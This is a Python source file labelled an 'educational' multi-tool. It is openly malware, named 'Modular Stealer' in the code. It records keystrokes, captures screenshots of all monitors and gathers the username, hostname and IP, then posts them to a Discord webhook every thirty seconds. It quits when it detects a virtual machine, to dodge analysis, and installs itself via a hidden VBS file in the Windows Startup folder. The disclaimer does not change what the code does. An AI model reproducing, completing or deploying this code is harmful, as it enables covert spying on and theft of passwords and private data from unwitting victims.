# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================

import os
import sys
import json
import requests
import platform
import socket
import getpass
import time
import threading
from datetime import datetime
import keyboard
import mss
import mss.tools
import io
import base64
import sqlite3

# Configuration
CONFIG = {
    "webhook": "YOUR_WEBHOK-URL",
    "modules": ["system_info", "keylogger"],
    "options": ["Anti-VM", "Startup"],
    "build_date": "2025-01-01"
}

def send_to_discord(data, title="📡 Modular Stealer Report"):
    """Send data to Discord webhook"""
    try:
        embed = {
            "title": title,
            "color": 16711680,
            "fields": [],
            "timestamp": datetime.now().isoformat()
        }
        
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:500]
            else:
                value_str = str(value)[:500]
            
            embed["fields"].append({
                "name": str(key).replace('_', ' ').title(),
                "value": value_str,
                "inline": False
            })
        
        payload = {
            "embeds": [embed],
            "username": "Modular Stealer"
        }
        
        response = requests.post(CONFIG["webhook"], json=payload, timeout=15)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[-] Discord send error: {e}")
        return False

def start_keylogger(webhook_url):
    """Start keylogger with screenshot capture"""
    
    logs = ""
    lock = threading.Lock()
    screenshot_count = 0
    running = True
    
    def capture_all_screens():
        """Capture all monitors"""
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                screenshots = []
                
                for i, monitor in enumerate(monitors[1:]):
                    screenshot = sct.grab(monitor)
                    img = mss.tools.to_png(screenshot.rgb, screenshot.size)
                    
                    img_base64 = base64.b64encode(img).decode('utf-8')
                    screenshots.append({
                        "monitor": i + 1,
                        "image_base64": img_base64[:100] + "..." if len(img_base64) > 100 else img_base64,
                        "resolution": f"{screenshot.width}x{screenshot.height}"
                    })
                
                return screenshots
        except Exception as e:
            return {"error": str(e)}
    
    def send_to_discord_internal():
        """Send logs and screenshots to Discord"""
        nonlocal logs, screenshot_count, running
        
        while running:
            time.sleep(30)
            
            with lock:
                data_to_send = {}
                
                if logs:
                    data_to_send["keylogs"] = logs
                    logs = ""
                
                try:
                    screenshots = capture_all_screens()
                    if screenshots:
                        data_to_send["screenshots"] = screenshots
                        screenshot_count += len(screenshots)
                except Exception as e:
                    data_to_send["screenshot_error"] = str(e)
                
                if data_to_send:
                    try:
                        embed = {
                            "title": "🔑 Keylogger Report",
                            "color": 16711680,
                            "fields": [],
                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
                        }
                        
                        if "keylogs" in data_to_send:
                            logs_text = data_to_send["keylogs"]
                            if len(logs_text) > 1000:
                                logs_text = logs_text[:1000] + "..."
                            
                            embed["fields"].append({
                                "name": "Keystrokes",
                                "value": f"```\n{logs_text}\n```",
                                "inline": False
                            })
                        
                        if "screenshots" in data_to_send:
                            screenshot_info = []
                            for screenshot in data_to_send["screenshots"]:
                                if "resolution" in screenshot:
                                    screenshot_info.append(f"Monitor {screenshot['monitor']}: {screenshot['resolution']}")
                            
                            if screenshot_info:
                                embed["fields"].append({
                                    "name": "📸 Screenshots",
                                    "value": "\n".join(screenshot_info),
                                    "inline": True
                                })
                        
                        payload = {
                            "embeds": [embed],
                            "username": "Keylogger Agent"
                        }
                        
                        response = requests.post(webhook_url, json=payload, timeout=10)
                        return response.status_code in [200, 204]
                        
                    except Exception as e:
                        print(f"[-] Failed to send: {e}")
                        return False
        
        return True
    
    def on_press(event):
        """Handle key press events"""
        nonlocal logs
        
        with lock:
            try:
                if event.name:
                    if len(event.name) == 1:
                        logs += event.name
                    elif event.name == "space":
                        logs += " "
                    elif event.name == "enter":
                        logs += "\n"
                    elif event.name == "backspace":
                        if len(logs) > 0:
                            logs = logs[:-1]
                    elif event.name == "tab":
                        logs += "\t"
                    else:
                        logs += f"[{event.name.upper()}]"
            except:
                logs += "[UNKNOWN]"
    
    def stop_keylogger():
        """Stop the keylogger"""
        nonlocal running
        running = False
        keyboard.unhook_all()
    
    try:
        keyboard.on_press(on_press)
        
        send_thread = threading.Thread(target=send_to_discord_internal, daemon=True)
        send_thread.start()
        
        return {
            "success": True,
            "thread_alive": send_thread.is_alive(),
            "start_time": time.time(),
            "stop_function": stop_keylogger
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

def collect_system_info():
    """Collect system information"""
    info = {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "processor": platform.processor(),
        "architecture": platform.architecture()[0],
        "ip": socket.gethostbyname(socket.gethostname()),
        "timestamp": datetime.now().isoformat()
    }
    return info

def check_vm():
    """Check if running in virtual machine"""
    vm_indicators = [
        "vmware", "virtualbox", "qemu", "xen", "vbox", "hyper-v",
        "vmx", "vmic", "hv", "virtual", "innotek", "parallels"
    ]
    
    system_info = str(platform.uname()).lower()
    
    for indicator in vm_indicators:
        if indicator in system_info:
            return True
    
    return False

def add_to_startup():
    """Add to Windows startup"""
    try:
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            os.path.basename(sys.executable)
        )
        
        if hasattr(sys, 'frozen'):
            exe_path = sys.executable
        else:
            exe_path = __file__
        
        with open(startup_path + ".vbs", "w") as f:
            f.write(f'CreateObject("Wscript.Shell").Run """{exe_path}""", 0, False')
        
        return True
    except Exception as e:
        print(f"[-] Startup error: {e}")
        return False

def main():
    """Main execution function"""
    results = {}
    
    if "Anti-VM" in CONFIG["options"]:
        if check_vm():
            print("[!] VM detected - exiting")
            return
    
    if "Startup" in CONFIG["options"]:
        add_to_startup()
    
    if "system_info" in CONFIG["modules"]:
        try:
            results["system_info"] = collect_system_info()
            print("[+] System info collected")
        except Exception as e:
            results["system_info"] = {"error": str(e)}
    
    keylogger_result = None
    if "keylogger" in CONFIG["modules"]:
        print("[+] Starting keylogger...")
        keylogger_result = start_keylogger(CONFIG["webhook"])
        
        if keylogger_result and keylogger_result.get("success"):
            print("[✓] Keylogger started")
        else:
            print("[-] Keylogger failed")
    
    if results:
        send_to_discord(results, "🧩 Initial Stealer Report")
        print("[+] Initial results sent")
    
    if "keylogger" in CONFIG["modules"] and keylogger_result and keylogger_result.get("success"):
        print("[*] Keylogger running. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            if "stop_function" in keylogger_result:
                keylogger_result["stop_function"]()
                print("[✓] Keylogger stopped")

if __name__ == "__main__":
    time.sleep(2)
    main_thread = threading.Thread(target=main, daemon=True)
    main_thread.start()
    
    try:
        while main_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Interrupted")
    
    print("[*] Exiting")